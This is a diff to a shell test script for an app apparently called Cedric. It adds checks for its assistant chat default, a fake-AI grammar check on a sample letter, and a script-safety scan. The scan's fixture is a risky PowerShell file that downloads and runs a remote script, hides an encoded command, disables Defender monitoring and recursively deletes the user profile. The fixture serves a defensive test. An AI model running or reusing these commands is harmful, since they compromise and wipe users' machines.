@@ -49,12 +49,42 @@ CEDRIC_SESSION_DIR="$WORK/session-chat" CEDRIC_NO_RESTORE=1 CEDRIC_NO_SESSION_SA
 CEDRIC_OPEN="$WORK/Sum.swift" CEDRIC_OWL=1 CEDRIC_OWL_RESET=1 CEDRIC_OWL_CHAT=1 CEDRIC_OWL_TOOLS=1 \
 CEDRIC_AI=1 CEDRIC_AI_FAKE=0.3 CEDRIC_OWL_CHAT_FAKE_DELAY=0.12 CEDRIC_AI_AUTO=0 CEDRIC_AI_DEFAULTS="$SUITE" \
 CEDRIC_SNAPSHOT_SIZE=760x420 CEDRIC_OWL_CHECK="$OUT/chat" CEDRIC_OWL_CHECK_CHAT=1 "$BIN" || status=1
-# The switch is off by default: no CEDRIC_OWL_CHAT, owlChat never set (the
-# check fails if it was), the fake AI on so only the switch keeps it off.
+# Ask Cedric's default follows the engine: off with none ready
+# (CEDRIC_ASK_ENGINE=0; the owl offers to set one up), on with one (the
+# fake), where the owl's first item is Ask about this file… and the
+# one-time hint shows. No CEDRIC_OWL_CHAT, owlChat never set (the checks
+# fail if it was).
 env -u CEDRIC_OWL_CHAT CEDRIC_SESSION_DIR="$WORK/session-chat-off" CEDRIC_NO_RESTORE=1 CEDRIC_NO_SESSION_SAVE=1 \
-CEDRIC_OPEN="$WORK/Sum.swift" CEDRIC_OWL=1 CEDRIC_OWL_RESET=1 \
+CEDRIC_OPEN="$WORK/Sum.swift" CEDRIC_OWL=1 CEDRIC_OWL_RESET=1 CEDRIC_ASK_ENGINE=0 \
 CEDRIC_AI=1 CEDRIC_AI_FAKE=0.3 CEDRIC_AI_AUTO=0 CEDRIC_AI_DEFAULTS="$SUITE" \
 CEDRIC_OWL_CHECK="$OUT/chat-off" CEDRIC_OWL_CHECK_CHAT_OFF=1 "$BIN" || status=1
+env -u CEDRIC_OWL_CHAT CEDRIC_SESSION_DIR="$WORK/session-chat-on" CEDRIC_NO_RESTORE=1 CEDRIC_NO_SESSION_SAVE=1 \
+CEDRIC_OPEN="$WORK/Sum.swift" CEDRIC_OWL=1 CEDRIC_OWL_RESET=1 CEDRIC_ASK_HINT=1 CEDRIC_ASK_HINT_AFTER=0.5 \
+CEDRIC_AI=1 CEDRIC_AI_FAKE=0.3 CEDRIC_OWL_CHAT_FAKE_DELAY=0.05 CEDRIC_AI_AUTO=0 CEDRIC_AI_DEFAULTS="$SUITE" \
+CEDRIC_SNAPSHOT_SIZE=760x420 CEDRIC_OWL_CHECK="$OUT/chat-on" CEDRIC_OWL_CHECK_CHAT=default "$BIN" || status=1
+# Is This Script Safe to Run? on a risky PowerShell script: with the fake
+# AI, then with Ask Cedric off (the offline scan alone).
+cat > "$WORK/setup.ps1" <<'PS1'
+# Sets up the tools
+Set-ExecutionPolicy Bypass -Scope Process -Force
+iex (New-Object Net.WebClient).DownloadString('https://example.com/install.ps1')
+powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAA=
+Set-MpPreference -DisableRealtimeMonitoring $true
+Remove-Item -Path "$env:USERPROFILE\*" -Recurse -Force
+Write-Host "Done"
+PS1
+for chat in 1 0; do
+    CEDRIC_SESSION_DIR="$WORK/session-script-$chat" CEDRIC_NO_RESTORE=1 CEDRIC_NO_SESSION_SAVE=1 \
+    CEDRIC_OPEN="$WORK/setup.ps1" CEDRIC_OWL=1 CEDRIC_OWL_RESET=1 CEDRIC_OWL_CHAT=$chat \
+    CEDRIC_AI=1 CEDRIC_AI_FAKE=0.3 CEDRIC_OWL_CHAT_FAKE_DELAY=0.05 CEDRIC_AI_AUTO=0 CEDRIC_AI_DEFAULTS="$SUITE" \
+    CEDRIC_SNAPSHOT_SIZE=760x420 CEDRIC_OWL_CHECK="$OUT/script-$chat" CEDRIC_OWL_CHECK_CHAT=script "$BIN" || status=1
+done
+# Check Grammar with AI (fake engine) on a letter.
+printf 'Dear Sam,\n\nThe trip took longer then I expected, but the weather was kind to us and the views were lovely. We will send photos when we are home again next week.\n\nBest wishes,\nAlex\n' > "$WORK/letter.txt"
+CEDRIC_SESSION_DIR="$WORK/session-grammar-ai" CEDRIC_NO_RESTORE=1 CEDRIC_NO_SESSION_SAVE=1 \
+CEDRIC_OPEN="$WORK/letter.txt" CEDRIC_OWL=1 CEDRIC_OWL_RESET=1 CEDRIC_OWL_CHAT=1 CEDRIC_GRAMMAR_FAKE=1 CEDRIC_GRAMMAR_PAUSE=0.3 \
+CEDRIC_AI=1 CEDRIC_AI_FAKE=0.3 CEDRIC_AI_AUTO=0 CEDRIC_AI_DEFAULTS="$SUITE" \
+CEDRIC_SNAPSHOT_SIZE=760x420 CEDRIC_OWL_CHECK="$OUT/grammar-ai" CEDRIC_OWL_CHECK_CHAT=grammar "$BIN" || status=1
 defaults delete "$SUITE" >/dev/null 2>&1 || true
 rm -f "$HOME/Library/Preferences/$SUITE.plist"
 echo "owl-check: snapshots in $OUT"
